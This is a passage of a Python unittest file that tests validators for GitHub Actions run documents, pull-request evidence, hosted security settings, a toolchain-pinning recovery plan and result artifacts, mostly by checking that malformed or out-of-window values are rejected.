                    "FR0017_EPOCH18_CURRENT_ATTEMPT_JOBS",
                ),
            ):
                self.validate(ordinary, attempt)

    def test_attempt_one_cannot_start_before_original_run(self) -> None:
        ordinary, attempt = run_documents()
        ordinary["attempt"] = 1
        attempt["attempt"] = 1
        attempt["createdAt"] = ordinary["createdAt"]
        attempt["startedAt"] = utc(9, 59, 59)
        attempt["url"] = (
            f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}/attempts/1"
        )
        with self.assertRaisesRegex(ValueError, "EPOCH18_RUN_CHRONOLOGY"):
            self.validate(ordinary, attempt)

    def test_attempt_one_job_cannot_start_before_original_run(self) -> None:
        ordinary, attempt = run_documents()
        ordinary["attempt"] = 1
        attempt["attempt"] = 1
        attempt["createdAt"] = ordinary["createdAt"]
        attempt["startedAt"] = ordinary["createdAt"]
        attempt["url"] = (
            f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}/attempts/1"
        )
        set_job_times(
            ordinary,
            attempt,
            "build-test",
            started_at=utc_fraction(9, 59, 59, 999_999),
            completed_at=utc(10, 1),
        )
        with self.assertRaisesRegex(ValueError, "FR0017_JOB_TIME"):
            self.validate(ordinary, attempt)

    def test_noncritical_job_outer_bounds_are_exact(self) -> None:
        ordinary, attempt = live_run_documents(2)
        set_job_times(
            ordinary,
            attempt,
            "build-test",
            started_at=ordinary["createdAt"],
            completed_at=ordinary["updatedAt"],
        )
        self.validate(ordinary, attempt)
        attacks = (
            (
                "before-original",
                utc_fraction(17, 55, 24, 999_999),
                utc(17, 56),
            ),
            (
                "after-updated",
                utc(17, 55, 25),
                utc_fraction(17, 58, 57, 1),
            ),
        )
        for label, started_at, completed_at in attacks:
            ordinary, attempt = live_run_documents(2)
            set_job_times(
                ordinary,
                attempt,
                "build-test",
                started_at=started_at,
                completed_at=completed_at,
            )
            with (
                self.subTest(label=label),
                self.assertRaisesRegex(ValueError, "FR0017_JOB_TIME"),
            ):
                self.validate(ordinary, attempt)

    def test_critical_job_attempt_bounds_are_exact(self) -> None:
        for name in ("supply-chain", "attest-ci-audit-result"):
            ordinary, attempt = live_run_documents(2)
            set_job_times(
                ordinary,
                attempt,
                name,
                started_at=attempt["startedAt"],
                completed_at=attempt["updatedAt"],
            )
            with self.subTest(name=name, boundary="exact"):
                self.validate(ordinary, attempt)

            ordinary, attempt = live_run_documents(2)
            set_job_times(
                ordinary,
                attempt,
                name,
                started_at=utc_fraction(17, 57, 7, 999_999),
                completed_at=utc(17, 57, 30),
            )
            with (
                self.subTest(name=name, boundary="before-start"),
                self.assertRaisesRegex(
                    ValueError,
                    "FR0017_EPOCH18_CURRENT_ATTEMPT_JOBS",
                ),
            ):
                self.validate(ordinary, attempt)

            ordinary, attempt = live_run_documents(2)
            set_job_times(
                ordinary,
                attempt,
                name,
                started_at=attempt["startedAt"],
                completed_at=utc_fraction(17, 58, 57, 1),
            )
            with (
                self.subTest(name=name, boundary="after-updated"),
                self.assertRaisesRegex(ValueError, "FR0017_JOB_TIME"),
            ):
                self.validate(ordinary, attempt)

    def test_cross_run_job_url_is_rejected(self) -> None:
        ordinary, attempt = run_documents()
        attempt["jobs"][0]["url"] = (
            "https://github.com/sepahead/haldir/actions/runs/999/job/50001"
        )
        ordinary["jobs"] = copy.deepcopy(attempt["jobs"])
        with self.assertRaisesRegex(ValueError, "FR0017_JOB"):
            PROTOCOL.validate_epoch18_run_documents(
                ordinary,
                attempt,
                workflow="ci",
                subject_commit=COMMIT,
                expected_ref="refs/heads/main",
            )

    def test_cross_attempt_documents_are_rejected(self) -> None:
        ordinary, attempt = run_documents()
        ordinary["attempt"] = 1
        with self.assertRaisesRegex(ValueError, "EPOCH18_RUN_METADATA"):
            PROTOCOL.validate_epoch18_run_documents(
                ordinary,
                attempt,
                workflow="ci",
                subject_commit=COMMIT,
                expected_ref="refs/heads/main",
            )

    def test_ordinary_attempt_job_mismatch_is_rejected(self) -> None:
        ordinary, attempt = live_run_documents(2)
        attempt["jobs"] = copy.deepcopy(attempt["jobs"])
        selected = next(
            item for item in attempt["jobs"] if item["name"] == "build-test"
        )
        selected["completedAt"] = utc(17, 56, 31)
        selected["steps"][0]["completedAt"] = utc(17, 56, 31)
        with self.assertRaisesRegex(ValueError, "EPOCH18_RUN_JOB_MISMATCH"):
            self.validate(ordinary, attempt)

    def test_run_integer_fields_reject_bool_and_float(self) -> None:
        cases = (
            ("run_id", "databaseId", RUN_ID),
            ("attempt", "attempt", ATTEMPT),
            ("run_number", "number", RUN_NUMBER),
            (
                "workflow_id",
                "workflowDatabaseId",
                PROTOCOL.WORKFLOW_DATABASE_IDS["ci"],
            ),
        )
        for label, field, valid in cases:
            for invalid in (True, float(valid)):
                for side in ("ordinary", "attempt"):
                    ordinary, attempt = run_documents()
                    document = ordinary if side == "ordinary" else attempt
                    document[field] = invalid
                    with (
                        self.subTest(label=label, invalid=invalid, side=side),
                        self.assertRaisesRegex(ValueError, "FR0017_INTEGER"),
                    ):
                        self.validate(ordinary, attempt)
        for label, invalid in (
            ("job_id_bool", True),
            ("job_id_float", 50_001.0),
            ("step_number_bool", True),
            ("step_number_float", 1.0),
        ):
            for side in ("ordinary", "attempt"):
                ordinary, attempt = run_documents()
                attempt["jobs"] = copy.deepcopy(attempt["jobs"])
                document = ordinary if side == "ordinary" else attempt
                if label.startswith("job_id"):
                    document["jobs"][0]["databaseId"] = invalid
                else:
                    document["jobs"][0]["steps"][0]["number"] = invalid
                with (
                    self.subTest(label=label, side=side),
                    self.assertRaisesRegex(ValueError, "FR0017_INTEGER"),
                ):
                    self.validate(ordinary, attempt)

    def test_step_one_second_tolerance_is_exact(self) -> None:
        ordinary, attempt = run_documents()
        selected = next(
            item for item in ordinary["jobs"] if item["name"] == "build-test"
        )["steps"][0]
        selected["startedAt"] = utc(12, 0, 59)
        selected["completedAt"] = utc(12, 3, 1)
        self.validate(ordinary, attempt)

        ordinary, attempt = run_documents()
        selected = next(
            item for item in ordinary["jobs"] if item["name"] == "build-test"
        )["steps"][0]
        selected["startedAt"] = utc_fraction(
            12,
            0,
            58,
            999_999,
        )
        with self.assertRaisesRegex(ValueError, "FR0017_STEP_TIME"):
            self.validate(ordinary, attempt)

        ordinary, attempt = run_documents()
        selected = next(
            item for item in ordinary["jobs"] if item["name"] == "build-test"
        )["steps"][0]
        selected["completedAt"] = utc_fraction(
            12,
            3,
            1,
            1,
        )
        with self.assertRaisesRegex(ValueError, "FR0017_STEP_TIME"):
            self.validate(ordinary, attempt)

    def test_attempt_bound_is_fail_closed(self) -> None:
        ordinary, attempt = run_documents()
        ordinary["attempt"] = attempt["attempt"] = 9
        with self.assertRaisesRegex(ValueError, "epoch18.attempt_number"):
            PROTOCOL.validate_epoch18_run_documents(
                ordinary,
                attempt,
                workflow="ci",
                subject_commit=COMMIT,
                expected_ref="refs/heads/main",
            )


class PullRequestQualificationTests(unittest.TestCase):
    def validate(self, value: dict) -> dict:
        with mock.patch.object(
            BRIDGE,
            "_metadata",
            return_value={"committer_date": utc(12, 0)},
        ):
            return BRIDGE.validate_pull_request_evidence(
                ROOT,
                value,
                repair_commit=COMMIT,
                containing_commit="d" * 40,
                protocol=PROTOCOL,
            )

    def test_exact_closed_unmerged_two_parent_pr(self) -> None:
        value = pull_request_record()
        result = self.validate(value)
        successful = {
            name
            for run in result["runs"].values()
            for name, job_value in (
                PROTOCOL.validate_pull_request_run_document(
                    run,
                    workflow=run["workflowName"],
                    subject_commit=COMMIT,
                    head_branch="recovery/fr0017",
                )["jobs"].items()
            )
            if job_value["conclusion"] == "success"
        }
        self.assertEqual(successful, BRIDGE.REQUIRED_PRE_ACCEPT_CHECKS)
        self.assertEqual(
            result["synthetic_merge"]["parents"],
            [
                {
                    "sha": BRIDGE.PARENT,
                    "url": (
                        "https://api.github.com/repos/sepahead/haldir/git/"
                        f"commits/{BRIDGE.PARENT}"
                    ),
                },
                {
                    "sha": COMMIT,
                    "url": (
                        "https://api.github.com/repos/sepahead/haldir/git/"
                        f"commits/{COMMIT}"
                    ),
                },
            ],
        )
        self.assertFalse(result["pull_request"]["merged"])

    def test_pr_dispatcher_is_exactly_one_completed_success(self) -> None:
        value = pull_request_record()
        result = PROTOCOL.validate_pull_request_run_document(
            value["runs"]["ci"],
            workflow="ci",
            subject_commit=COMMIT,
            head_branch="recovery/fr0017",
        )
        matches = [
            step
            for step in result["jobs"]["supply-chain"]["steps"]
            if step["name"] == PROTOCOL.DISPATCHER_STEP_NAME
        ]
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0]["status"], "completed")
        self.assertEqual(matches[0]["conclusion"], "success")

    def test_pr_dispatcher_adversarial_mutations_are_rejected(self) -> None:
        for mutation in (
            "missing",
            "duplicate",
            "skipped",
            "failed",
            "wrong_name",
            "wrong_job",
        ):
            value = pull_request_record()
            ci_run = value["runs"]["ci"]
            supply = next(
                job for job in ci_run["jobs"] if job["name"] == "supply-chain"
            )
            dispatcher = next(
                step
                for step in supply["steps"]
                if step["name"] == PROTOCOL.DISPATCHER_STEP_NAME
            )
            if mutation == "duplicate":
                duplicate = copy.deepcopy(dispatcher)
                duplicate["number"] = (
                    max(step["number"] for step in supply["steps"]) + 1
                )
                supply["steps"].append(duplicate)
            elif mutation == "skipped":
                dispatcher["conclusion"] = "skipped"
            elif mutation == "failed":
                dispatcher["conclusion"] = "failure"
            else:
                dispatcher["name"] = "different successful step"
                if mutation == "wrong_job":
                    target = next(
                        job for job in ci_run["jobs"] if job["name"] == "build-test"
                    )
                    target["steps"][-1]["name"] = PROTOCOL.DISPATCHER_STEP_NAME
            with self.subTest(mutation=mutation), self.assertRaises(ValueError):
                PROTOCOL.validate_pull_request_run_document(
                    ci_run,
                    workflow="ci",
                    subject_commit=COMMIT,
                    head_branch="recovery/fr0017",
                )

    def test_pr_run_head_is_head_commit_not_synthetic_merge(self) -> None:
        value = pull_request_record()
        value["runs"]["ci"]["headSha"] = value["synthetic_merge"]["sha"]
        with self.assertRaisesRegex(ValueError, "PULL_REQUEST_RUN_METADATA"):
            self.validate(value)

    def test_attestation_jobs_must_be_skipped(self) -> None:
        for workflow in ("ci", "formal"):
            value = pull_request_record()
            attestation = next(
                item
                for item in value["runs"][workflow]["jobs"]
                if item["name"].startswith("attest-")
            )
            attestation["conclusion"] = "success"
            with (
                self.subTest(workflow=workflow),
                self.assertRaisesRegex(ValueError, "PULL_REQUEST_ATTESTATION_JOB"),
            ):
                self.validate(value)

    def test_required_job_and_checkout_must_succeed(self) -> None:
        value = pull_request_record()
        required = next(
            item
            for item in value["runs"]["ci"]["jobs"]
            if item["name"] == "supply-chain"
        )
        required["conclusion"] = "skipped"
        with self.assertRaisesRegex(ValueError, "PULL_REQUEST_JOB"):
            self.validate(value)

        value = pull_request_record()
        required = next(
            item
            for item in value["runs"]["ci"]["jobs"]
            if item["name"] == "supply-chain"
        )
        required["steps"][0]["name"] = "Unrelated successful step"
        with self.assertRaisesRegex(ValueError, "PULL_REQUEST_JOB_STEPS"):
            self.validate(value)

    def test_each_run_is_bound_to_the_exact_recorded_pull_request(self) -> None:
        value = pull_request_record()
        value["run_pull_request_associations"]["ci"]["pull_request"]["number"] = 18
        with self.assertRaisesRegex(RuntimeError, "RUN_ASSOCIATION"):
            self.validate(value)

        value = pull_request_record()
        value["run_pull_request_associations"]["formal"]["pull_request"]["head"][
            "sha"
        ] = "e" * 40
        with self.assertRaisesRegex(RuntimeError, "RUN_ASSOCIATION"):
            self.validate(value)

        value = pull_request_record()
        value["run_pull_request_associations"]["ci"]["run_id"] = 99
        with self.assertRaisesRegex(RuntimeError, "RUN_ASSOCIATION"):
            self.validate(value)

        value = pull_request_record()
        value["run_pull_request_associations"]["observed_pull_request"]["state"] = (
            "closed"
        )
        with self.assertRaisesRegex(RuntimeError, "OPEN_OBSERVATION"):
            self.validate(value)

        value = pull_request_record()
        value["run_pull_request_associations"]["captured_at_utc"] = utc(11, 9)
        with self.assertRaisesRegex(RuntimeError, "OPEN_CHRONOLOGY"):
            self.validate(value)

    def test_pr_identity_and_merge_are_closed_schemas(self) -> None:
        mutations = (
            ("open", lambda value: value["pull_request"].__setitem__("state", "open")),
            ("merged", lambda value: value["pull_request"].__setitem__("merged", True)),
            (
                "merged_at",
                lambda value: value["pull_request"].__setitem__(
                    "merged_at", utc(11, 20)
                ),
            ),
            (
                "parent_order",
                lambda value: value["synthetic_merge"]["parents"].reverse(),
            ),
            (
                "extra",
                lambda value: value["pull_request"].__setitem__("extra", None),
            ),
            (
                "oversized_head_ref",
                lambda value: value["pull_request"]["head"].__setitem__(
                    "ref", "r" * 256
                ),
            ),
        )
        for label, mutate in mutations:
            value = pull_request_record()
            mutate(value)
            with self.subTest(label=label), self.assertRaises(RuntimeError):
                self.validate(value)

    def test_pr_numeric_and_boolean_types_are_exact(self) -> None:
        for path, invalid in (
            (("pull_request", "number"), True),
            (("pull_request", "database_id"), 1.0),
            (("pull_request", "draft"), 0),
            (("pull_request", "locked"), 0),
            (("pull_request", "merged"), 0),
            (("runs", "ci", "attempt"), True),
        ):
            value = pull_request_record()
            target: Any = value
            for part in path[:-1]:
                target = target[part]
            target[path[-1]] = invalid
            with self.subTest(path=path), self.assertRaises((RuntimeError, ValueError)):
                self.validate(value)

    def test_pr_commands_and_chronology_are_bound(self) -> None:
        value = pull_request_record()
        value["capture"]["commands"]["open_ci_run"] += " --attempt 2"
        with self.assertRaisesRegex(RuntimeError, "PULL_REQUEST_CAPTURE"):
            self.validate(value)

        value = pull_request_record()
        value["capture"]["captured_at_utc"] = utc(11, 19)
        with self.assertRaisesRegex(RuntimeError, "CAPTURE_CHRONOLOGY"):
            self.validate(value)

        value = pull_request_record()
        value["runs"]["formal"]["updatedAt"] = utc(11, 21)
        with self.assertRaisesRegex(RuntimeError, "OPEN_CHRONOLOGY"):
            self.validate(value)


class HostedSettingsCaptureTests(unittest.TestCase):
    @staticmethod
    def metadata(_repo: Path, commit: str) -> dict[str, str]:
        return {"committer_date": (utc(11, 0) if commit == COMMIT else utc(12, 0))}

    def validate(self, value: dict) -> dict:
        with mock.patch.object(BRIDGE, "_metadata", side_effect=self.metadata):
            return BRIDGE.validate_hosted_settings_capture(
                ROOT,
                value,
                qualification_commit=COMMIT,
                containing_commit="d" * 40,
            )

    def test_exact_security_and_actions_policy(self) -> None:
        result = self.validate(hosted_settings_record())
        settings = result["settings"]
        self.assertTrue(settings["private_vulnerability_reporting"]["enabled"])
        self.assertEqual(
            settings["vulnerability_alerts"],
            {"enabled": True, "http_status": 204},
        )
        self.assertEqual(
            settings["actions_permissions"]["allowed_actions"],
            "selected",
        )
        self.assertTrue(settings["actions_permissions"]["sha_pinning_required"])
        self.assertFalse(result["history_scope"]["durable_historical_transition_proof"])

    def test_security_settings_are_closed_and_value_exact(self) -> None:
        mutations = (
            lambda value: value["settings"].__setitem__("extra", None),
            lambda value: value["settings"]["actions_permissions"].__setitem__(
                "allowed_actions", "all"
            ),
            lambda value: value["settings"]["selected_actions"][
                "patterns_allowed"
            ].append("owner/*"),
            lambda value: value["settings"]["dependabot_security_updates"].__setitem__(
                "paused", True
            ),
            lambda value: value["settings"]["repository_security_and_analysis"][
                "secret_scanning_push_protection"
            ].__setitem__("status", "disabled"),
            lambda value: value["settings"]["workflow_permissions"].__setitem__(
                "default_workflow_permissions", "write"
            ),
        )
        for index, mutate in enumerate(mutations):
            value = hosted_settings_record()
            mutate(value)
            with (
                self.subTest(index=index),
                self.assertRaisesRegex(RuntimeError, "HOSTED_SETTINGS_POLICY"),
            ):
                self.validate(value)

    def test_settings_boolean_and_status_types_reject_aliases(self) -> None:
        paths = (
            ("actions_permissions", "enabled"),
            ("actions_permissions", "sha_pinning_required"),
            ("dependabot_security_updates", "enabled"),
            ("dependabot_security_updates", "paused"),
            ("private_vulnerability_reporting", "enabled"),
            ("selected_actions", "github_owned_allowed"),
            ("selected_actions", "verified_allowed"),
            ("vulnerability_alerts", "enabled"),
            ("workflow_permissions", "can_approve_pull_request_reviews"),
        )
        for path in paths:
            value = hosted_settings_record()
            value["settings"][path[0]][path[1]] = int(
                value["settings"][path[0]][path[1]]
            )
            with (
                self.subTest(path=path),
                self.assertRaisesRegex(RuntimeError, "HOSTED_SETTINGS_POLICY"),
            ):
                self.validate(value)
        value = hosted_settings_record()
        value["settings"]["vulnerability_alerts"]["http_status"] = 204.0
        with self.assertRaisesRegex(RuntimeError, "HOSTED_SETTINGS_POLICY"):
            self.validate(value)

    def test_history_disclaimer_and_authority_are_type_exact(self) -> None:
        value = hosted_settings_record()
        value["history_scope"]["durable_historical_transition_proof"] = True
        with self.assertRaisesRegex(RuntimeError, "HOSTED_SETTINGS_HISTORY_SCOPE"):
            self.validate(value)
        value = hosted_settings_record()
        value["history_scope"]["activation_commit_self_observed"] = 0
        with self.assertRaisesRegex(RuntimeError, "HOSTED_SETTINGS_HISTORY_SCOPE"):
            self.validate(value)
        value = hosted_settings_record()
        value["authority"]["release_authority"] = 0
        with self.assertRaisesRegex(RuntimeError, "HOSTED_SETTINGS_AUTHORITY"):
            self.validate(value)

    def test_settings_head_commands_and_chronology_are_bound(self) -> None:
        value = hosted_settings_record()
        value["ref_after"]["object"]["sha"] = "e" * 40
        with self.assertRaisesRegex(RuntimeError, "HEAD_STABILITY"):
            self.validate(value)
        value = hosted_settings_record()
        value["capture"]["commands"]["repository"] += "?unexpected=1"
        with self.assertRaisesRegex(RuntimeError, "HOSTED_SETTINGS_CAPTURE"):
            self.validate(value)
        value = hosted_settings_record()
        value["capture"]["captured_at_utc"] = utc(10, 59)
        with self.assertRaisesRegex(RuntimeError, "HOSTED_SETTINGS_CHRONOLOGY"):
            self.validate(value)

    def test_vulnerability_alert_status_parser_retains_no_headers(self) -> None:
        self.assertEqual(
            CAPTURE._http_no_content_status(
                b"HTTP/2.0 204 No Content\r\nX-Fixture: secret-free\r\n\r\n",
                label="fixture",
            ),
            204,
        )
        for raw in (
            b"HTTP/2.0 200 OK\r\n\r\n",
            b"HTTP/2.0 204 No Content\r\n\r\n{}",
            b"HTTP/2.0 204 No Content\r\nX: y\r\n",
        ):
            with self.subTest(raw=raw), self.assertRaises(CAPTURE.CaptureError):
                CAPTURE._http_no_content_status(raw, label="fixture")


class PlanContractTests(unittest.TestCase):
    def plan(self) -> dict:
        def record(_repo: Path, _commit: str, path: str) -> dict:
            return {
                "path": path,
                "git_mode": BRIDGE.REPAIR_MODES[path],
                "git_object_type": "blob",
                "git_object_id": "a" * 40,
                "sha256": "b" * 64,
                "bytes": 1,
            }

        with (
            mock.patch.object(BRIDGE, "file_record", side_effect=record),
            mock.patch.object(BRIDGE, "_core_diff", return_value=[]),
        ):
            return BRIDGE.expected_plan(ROOT, COMMIT)

    def test_plan_names_only_the_new_epoch_18_defect(self) -> None:
        plan = self.plan()
        self.assertEqual([defect["id"] for defect in plan["defects"]], ["FR0017-D01"])
        defect = plan["defects"][0]
        self.assertEqual(defect["observed_run_id"], 30_563_526_669)
        self.assertEqual(defect["observed_job_id"], 90_942_261_140)
        self.assertEqual(defect["observed_step_number"], 11)
        self.assertEqual(defect["observed_step_conclusion"], "skipped")
        self.assertEqual(defect["observation_role"], "DIAGNOSIS_ONLY_NOT_AUTHORITY")
        legacy = plan["legacy_boundary"]
        self.assertEqual(legacy["inherited_fr_0016_defect_count"], 4)
        self.assertEqual(
            legacy["inherited_fr_0016_defect_source"],
            "EXACT_SIGNED_FR_0016_PLAN",
        )
        limitations = " ".join(plan["limitations"])
        self.assertIn(
            "not an independently reproduced upstream Java build", limitations
        )
        self.assertIn("hosted Linux x64 input only", limitations)
        self.assertIn("excludes the complete legal subtree", limitations)

    def test_plan_closes_pr_concurrency_and_formal_runtime_contracts(self) -> None:
        correction = self.plan()["correction"]
        pull_request = correction["pull_request_mode"]
        self.assertEqual(
            pull_request["required_successful_jobs"],
            sorted(BRIDGE.REQUIRED_PRE_ACCEPT_CHECKS),
        )
        self.assertEqual(pull_request["required_successful_job_count"], 7)
        self.assertEqual(pull_request["final_disposition"], "CLOSED_UNMERGED")
        self.assertFalse(pull_request["seven_required_pre_accept_jobs_skipped"])
        self.assertTrue(pull_request["signed_linear_current_audit_gate_skipped"])
        self.assertFalse(pull_request["epoch_18_recovery_primitive_suite_skipped"])
        self.assertFalse(pull_request["pinned_cargo_deny_suite_skipped"])
        self.assertFalse(pull_request["formal_runner_suite_skipped"])
        self.assertFalse(pull_request["full_main_gate_replayed"])
        self.assertFalse(pull_request["runtime_checkout_sha_independently_attested"])
        self.assertEqual(
            pull_request["signed_linear_gate_replacement_commands"],
            [
                (
                    "python3 -I -B -W error "
                    "tools/release/test_verify_framework_recovery_fr_0017.py"
                ),
                "python3 -I -B -W error tools/test_pinned_cargo_deny.py",
                "python3 -I -B -W error tools/test_run_formal.py",
            ],
        )
        concurrency = correction["main_concurrency"]
        self.assertFalse(concurrency["main_cancel_in_progress"])
        self.assertFalse(concurrency["main_run_coalescing"])
        self.assertTrue(concurrency["non_main_cancel_in_progress"])
        self.assertEqual(
            correction["formal_toolchain"]["pins"],
            BRIDGE.FORMAL_PIN_CONTRACT,
        )
        self.assertEqual(
            correction["formal_toolchain"]["workflow_command"],
            BRIDGE.FORMAL_WORKFLOW_COMMAND,
        )
        self.assertEqual(
            correction["formal_pin_contract"]["top_level_formal_key_count"],
            16,
        )
        self.assertEqual(correction["formal_pin_contract"]["schema_version"], 3)
        self.assertEqual(
            set(BRIDGE.FORMAL_PIN_CONTRACT["formal"]),
            {
                "java_archive_architecture",
                "java_archive_bytes",
                "java_archive_name",
                "java_archive_package",
                "java_archive_root",
                "java_archive_sha256",
                "java_archive_url",
                "java_distribution",
                "java_release_tag",
                "java_runtime_architecture",
                "java_runtime_vendor",
                "java_runtime_version",
                "java_specification_version",
                "tla_tools_bytes",
                "tla_tools_sha256",
                "tla_tools_version",
            },
        )
        java_archive = correction["formal_toolchain"]["java_runtime_archive"]
        self.assertEqual(java_archive["bytes"], 52_099_793)
        self.assertEqual(
            java_archive["sha256"],
            "e5038aae3ca9ff670bc696496b0728dbd23d280026bad30291cb919221ecfdcb",
        )
        self.assertEqual(
            java_archive["runtime_property_checks"]["exact"],
            {
                "java.vendor": "Eclipse Adoptium",
                "java.runtime.version": "21.0.11+10-LTS",
                "java.specification.version": "21",
                "os.arch": "amd64",
            },
        )
        self.assertEqual(
            java_archive["safe_extraction"]["allowed_member_types"],
            ["DIRECTORY", "REGULAR_FILE", "REVIEWED_LEGAL_SYMLINK"],
        )
        self.assertTrue(
            java_archive["safe_extraction"][
                "unreviewed_links_and_special_files_rejected"
            ]
        )
        self.assertEqual(
            java_archive["safe_extraction"]["reviewed_legal_symlinks"],
            {
                "count": 145,
                "canonical_sorted_manifest_bytes": 13_095,
                "canonical_sorted_manifest_sha256": (
                    "e623b66f52db07699c4723e448b1a34531097e6c38ee63630da3dcd81729d576"
                ),
                "path_and_target_grammar_verified": True,
            },
        )
        self.assertTrue(
            java_archive["safe_extraction"]["legal_subtree_excluded_from_extraction"]
        )
        self.assertTrue(
            java_archive["safe_extraction"]["post_extract_tree_types_revalidated"]
        )
        self.assertEqual(
            {
                "directory": java_archive["safe_extraction"]["directory_mode"],
                "executable_file": java_archive["safe_extraction"][
                    "executable_file_mode"
                ],
                "non_executable_file": java_archive["safe_extraction"][
                    "non_executable_file_mode"
                ],
            },
            {
                "directory": "0700",
                "executable_file": "0700",
                "non_executable_file": "0600",
            },
        )
        self.assertTrue(java_archive["download"]["retry_all_errors"])
        self.assertEqual(java_archive["download"]["maximum_redirects"], 5)
        self.assertNotIn("setup_java", correction["formal_toolchain"])
        self.assertEqual(
            correction["local_formal_runtime"]["schema"],
            "HALDIR_FORMAL_RUNTIME_V2",
        )
        self.assertEqual(
            correction["local_formal_runtime"]["observed_architectures"],
            ["aarch64", "amd64", "x86_64"],
        )
        self.assertFalse(
            correction["local_formal_runtime"]["universal_amd64_runtime_claimed"]
        )
        self.assertTrue(
            correction["local_formal_runtime"][
                "hosted_archive_architecture_not_imposed_locally"
            ]
        )
        self.assertNotIn(
            "java_runtime_architecture",
            correction["local_formal_runtime"]["verified_tla_asset"],
        )
        self.assertNotIn(
            "actions/setup-java",
            json.dumps(correction, sort_keys=True),
        )
        ecosystem = correction["ecosystem_pin_contract"]
        self.assertEqual(
            [
                action["name"]
                for action in ecosystem["inherited_immutable_action_baseline"]
            ],
            ["actions/setup-python", "actions/attest"],
        )
        self.assertEqual(
            ecosystem["formal_java_runtime_acquisition"][
                "third_party_resolver_action_uses"
            ],
            0,
        )

    def test_plan_formal_pins_equal_the_closed_core_schema(self) -> None:
        with (ROOT / "tools/pins.toml").open("rb") as stream:
            source = tomllib.load(stream)
        parsed = PINS.parse_formal_pins(source)
        self.assertEqual(PINS.PIN_SCHEMA_VERSION, 3)
        self.assertEqual(
            BRIDGE.FORMAL_PIN_CONTRACT,
            {
                "schema_version": 3,
                "formal": parsed._asdict(),
            },
        )

    def test_plan_binds_epoch_18_transport_and_exact_hosted_policy(self) -> None:
        correction = self.plan()["correction"]
        self.assertEqual(
            correction["hosted_result_transport"]["governance_epoch"],
            18,
        )
        hosted = correction["hosted_settings_capture"]
        self.assertEqual(
            hosted["expected_policy"],
            BRIDGE.HOSTED_SETTINGS_EXPECTED_POLICY,
        )
        self.assertEqual(
            hosted["history_scope"],
            BRIDGE.HOSTED_SETTINGS_HISTORY_SCOPE,
        )
        self.assertFalse(hosted["durable_external_state_proof"])
        self.assertIn(
            "GitHub pull_request event semantics",
            " ".join(self.plan()["limitations"]),
        )


class ResultAndArtifactTests(unittest.TestCase):
    def validate_result(
        self,
        payload: bytes,
        materials: list,
        *,
        run_id: int = RUN_ID,
        attempt: int = ATTEMPT,
        run_number: int = RUN_NUMBER,
    ) -> dict:
        return PROTOCOL.validate_result_artifact(
            payload,
            workflow="ci",
            subject_commit=COMMIT,
            subject_tree=TREE,
            run_id=run_id,
            attempt=attempt,
            run_number=run_number,
            expected_ref="refs/heads/main",
            expected_materials=materials,
        )

    def validate_artifact(
        self,
        value: dict,
        payload: bytes,
        *,
        run_id: int = RUN_ID,
        attempt: int = ATTEMPT,
        producer_started: datetime | None = None,
        producer_completed: datetime | None = None,
        attestation_started: datetime | None = None,
    ) -> dict:
        return PROTOCOL.validate_artifact_metadata(
            value,
            workflow="ci",
            run_id=run_id,
            attempt=attempt,
            subject_commit=COMMIT,
            result_payload=payload,
            producer_started=producer_started
            or datetime(2026, 7, 29, 12, 1, tzinfo=timezone.utc),
            producer_completed=producer_completed
            or datetime(2026, 7, 29, 12, 4, tzinfo=timezone.utc),
            attestation_started=attestation_started
            or datetime(2026, 7, 29, 12, 6, tzinfo=timezone.utc),
        )

    def test_attempt_two_result_and_artifact(self) -> None:
        payload, materials = result_payload()
        self.validate_result(payload, materials)
        self.validate_artifact(artifact(payload), payload)

    def test_cross_attempt_result_is_rejected(self) -> None:
        payload, materials = result_payload(attempt=1)
        with self.assertRaisesRegex(ValueError, "RESULT_EXECUTION"):
            PROTOCOL.validate_result_artifact(
                payload,
                workflow="ci",
                subject_commit=COMMIT,
                subject_tree=TREE,
                run_id=RUN_ID,
                attempt=2,
                run_number=RUN_NUMBER,
                expected_ref="refs/heads/main",
                expected_materials=materials,
            )

    def test_cross_attempt_artifact_name_is_rejected(self) -> None:
        payload, _materials = result_payload()
        value = artifact(payload, attempt=1)
        with self.assertRaisesRegex(ValueError, "ARTIFACT_IDENTITY"):
            PROTOCOL.validate_artifact_metadata(
                value,
                workflow="ci",
                run_id=RUN_ID,
                attempt=2,
                subject_commit=COMMIT,
                result_payload=payload,
                producer_started=datetime(2026, 7, 29, 12, 1, tzinfo=timezone.utc),
                producer_completed=datetime(2026, 7, 29, 12, 4, tzinfo=timezone.utc),
                attestation_started=datetime(2026, 7, 29, 12, 6, tzinfo=timezone.utc),
            )

    def test_artifact_outside_producer_window_is_rejected(self) -> None:
        payload, _materials = result_payload()
        value = artifact(payload)
        value["updated_at"] = utc(12, 7)
        with self.assertRaisesRegex(ValueError, "ARTIFACT_CHRONOLOGY"):
            PROTOCOL.validate_artifact_metadata(
                value,
                workflow="ci",
                run_id=RUN_ID,
                attempt=ATTEMPT,
                subject_commit=COMMIT,
                result_payload=payload,
                producer_started=datetime(2026, 7, 29, 12, 1, tzinfo=timezone.utc),
                producer_completed=datetime(2026, 7, 29, 12, 4, tzinfo=timezone.utc),
                attestation_started=datetime(2026, 7, 29, 12, 6, tzinfo=timezone.utc),
            )

    def test_result_integer_and_authority_fields_reject_coercion(self) -> None:
        mutations = (
            ("repository_id", ("repository", "database_id"), PROTOCOL.REPOSITORY_ID),
            (
                "owner_id",
                ("repository", "owner_database_id"),
                PROTOCOL.REPOSITORY_OWNER_ID,
            ),
            ("run_id", ("execution", "run_id"), RUN_ID),
            ("attempt", ("execution", "run_attempt"), ATTEMPT),
            ("run_number", ("execution", "run_number"), RUN_NUMBER),
            ("material_bytes", ("materials", 0, "bytes"), 10),
        )
        for label, path, valid in mutations:
            for invalid in (True, float(valid)):
                payload, materials = result_payload()
                value = json.loads(payload)
                target: Any = value
                for component in path[:-1]:
                    target = target[component]
                target[path[-1]] = invalid
                mutated = PROTOCOL.canonical_json_bytes(value, pretty=True)
                with (
                    self.subTest(label=label, invalid=invalid),
                    self.assertRaisesRegex(ValueError, "FR0017_"),
                ):
                    self.validate_result(mutated, materials)
        for field, invalid in (
            ("provenance_only", 1),
            ("release_authority", 0),
            ("deployment_authority", 0.0),
            ("publication_authority", 0),
            ("tag_authority", 0.0),
        ):
            payload, materials = result_payload()
            value = json.loads(payload)
            value["authority"][field] = invalid
            with (
                self.subTest(field=field),
                self.assertRaisesRegex(ValueError, "RESULT_AUTHORITY"),
            ):
                self.validate_result(
